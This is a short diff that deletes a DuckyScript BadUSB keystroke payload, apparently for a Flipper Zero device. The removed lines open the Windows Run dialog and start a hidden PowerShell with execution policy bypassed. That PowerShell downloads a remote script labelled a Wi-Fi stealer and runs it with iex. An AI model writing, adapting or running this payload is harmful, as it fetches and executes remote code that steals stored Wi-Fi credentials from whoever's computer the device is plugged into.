@@ -1,4 +1,0 @@
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr https://raw.githubusercontent.com/Robin18m/Flipper-Zero-BadUSB-Payloads/main/Payloads/Wifi%20stealer/wifi.ps1 | iex
-ENTER
